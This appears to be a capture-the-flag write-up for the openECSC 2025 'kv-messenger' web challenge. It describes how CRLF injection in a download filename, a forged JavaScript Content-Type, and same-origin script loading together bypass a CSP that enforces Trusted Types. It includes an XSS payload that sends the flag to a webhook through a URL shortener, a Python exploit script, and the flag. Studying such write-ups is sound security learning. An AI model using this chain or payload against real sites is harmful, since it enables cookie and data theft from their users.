# openECSC 2025

## Challenge: kv-messenger

## Tags: web

## Difficulty: Medium

## Table of Contents

- [Solution Overview](#solution-overview)
- [Tools Used](#tools-used)
- [Solution](#solution)
- [Solution Script](#solution-script)
- [Flag](#flag)

### Solution Overview

This challenge requires bypassing a strict CSP policy that enforces Trusted Types and only allows same-origin scripts. The solution exploits:

1. **CRLF injection** in the `filename` parameter of `/download` to inject arbitrary HTTP headers
2. **Content-Type header injection** to serve stored messages as `application/javascript` instead of HTML
3. **Same-origin script loading** via `<script src>` to bypass Trusted Types restrictions (CSP allows `script-src 'self'`)
4. **88-byte response truncation** workaround using URL shorteners to fit the XSS payload within the limited response body

The attack chain: Store JS payload → CRLF inject Content-Type header → Load as same-origin script in victim page → Exfiltrate flag.

### Solution

#### Initial Recon

The challenge presents a simple key-value message storage application. Users can store messages and download them as HTML files. There's also a `/flag` endpoint that requires a secret cookie (which the bot has).

**Goal**: XSS the bot to steal its cookie and fetch `/flag`.

First roadblock? This CSP:

```
default-src 'self'; 
script-src 'self'; 
script-src-elem 'self'; 
base-uri 'none'; 
object-src 'none'; 
frame-ancestors 'none'; 
frame-src 'none'; 
require-trusted-types-for 'script';
```

Translation: "No inline scripts, no `eval()`, no external scripts, and you MUST use Trusted Types." 

Cool cool cool... 😅

#### The CSP Wall

The application wraps user messages in HTML:

```python
def generateHtmlMessage(uuid: str) -> str:
    return f'<h1>Message (UUIDv4: {uuid})></h1><code><pre>{content}</pre></code>'
```

I can inject HTML like `</pre></code><img src=x onerror=alert(1)>`, but CSP blocks inline event handlers. Even if I could inject `<script>`, CSP requires Trusted Types, making it nearly impossible.

**Dead end #1**: Direct HTML injection with inline scripts ❌

#### Finding the CRLF Injection

The `/download` endpoint has an interesting vulnerability in line 154:

```python
headers = [ { 'Content-Disposition': f'attachment; filename="{filename}.html"' } ]
```

The `filename` parameter is user-controlled and **not sanitized**. This means I can inject CRLF characters (`\r\n`) to add arbitrary HTTP headers!

```python
filename = 'test"\r\nX-Custom: injected'
# Results in:
# Content-Disposition: attachment; filename="test"
# X-Custom: injected.html"
```

**Key insight**: I can inject `Content-Type: application/javascript` to make the browser interpret our message content as JavaScript instead of HTML!

But wait... CSP still blocks scripts from non-`'self'` origins. How does this help?

#### The "Aha!" Moment

Here's the trick: **same-origin script loading**! 

The CSP policy allows `script-src 'self'`, which means scripts loaded from the same origin are trusted. If I:

1. Store JavaScript code as a message
2. Use CRLF injection to serve it with `Content-Type: application/javascript`
3. Load it via `<script src="http://localhost:8000/download?uuid=...&filename=...">` in another message

The browser sees it as a legitimate same-origin script and executes it! 🎉

**Three-stage attack**:
```
Message 1 (JS payload) → CRLF inject Content-Type → Load via <script src> in Message 2 → Bot visits Message 2 → JS executes → Flag stolen
```

####The 88-Byte Problem

Now for the fun part. My initial JavaScript payload was:

```javascript
fetch("/flag").then(r=>r.text()).then(d=>location="https://webhook.site/8b78691f-3d1f-4ca1-bcaa-0bcb344a8508?f="+d)
```

**Length**: 127 bytes  
**Problem**: The response gets truncated at exactly 88 bytes

Why? The HTTP server calculates `Content-Length` **before** our CRLF injection adds the `Content-Type` header. The normal HTML response for a single-character message is exactly 88 bytes:

```html
<h1>Message (UUIDv4: xxxxxxxx-...)></h1><code><pre>x</pre></code>
```

When I inject headers to change the content type, the browser still only reads 88 bytes of the body, cutting off our JavaScript mid-execution.

**Optimization attempts**:
1. Use protocol-relative URL: `//webhook.site/...` → Saved 6 bytes
2. Use `.json()` instead of `.text()` → Saved 3 bytes  
3. Extract just `d.value` instead of full response → Saved 2 bytes

**Final length**: Still 109 bytes. Still 21 bytes too long.

**Solution**: Use a URL shortener!

```javascript
fetch("/flag").then(r=>r.json()).then(d=>location="//tinyurl.com/2te9sk4y?f="+d.value)
```

**Final length**: 86 bytes ✅

The shortened URL (`tinyurl.com/2te9sk4y` → `webhook.site/8b78691f-...`) saved 37 characters, giving me the breathing room I needed!

#### Solution Script

The exploit works as follows:

1. **Store JS payload** with a short message (just `"x"`) to keep the base HTML small
2. **CRLF injection** the `Content-Type: application/javascript` header via the `filename` parameter
3. **Create HTML message** that breaks out of the `<pre>` tag and loads our JS via `<script src>`
4. **Send to bot** and wait for the exfiltrated flag

```python
# Store JavaScript as message
r = requests.post(f"{TARGET}/message", json={"value": "x"})
uuid = r.json()['uuid']

# CRLF injection to serve as JavaScript
js = 'fetch("/flag").then(r=>r.json()).then(d=>location="//tinyurl.com/2te9sk4y?f="+d.value)'
filename = f'x"\r\nContent-Type: application/javascript\r\n\r\n{js}'

# Create HTML that loads the JS
script_src = f"http://localhost:8000/download?uuid={uuid}&filename={urllib.parse.quote(filename)}"
html = f'</pre></code><script src="{script_src}"></script><code><pre>'
r = requests.post(f"{TARGET}/message", json={"value": html})
html_uuid = r.json()['uuid']

# Send to bot
bot_url = f"http://localhost:8000/download?uuid={html_uuid}&view=True"
requests.post(f"{TARGET}/report", json={"url": bot_url})
```

Full exploit: [exploit.py](exploit.py)

## Flag

**`openECSC{c21f_1nj3c710n_4nd_73_f02_7h3_w1n}`**

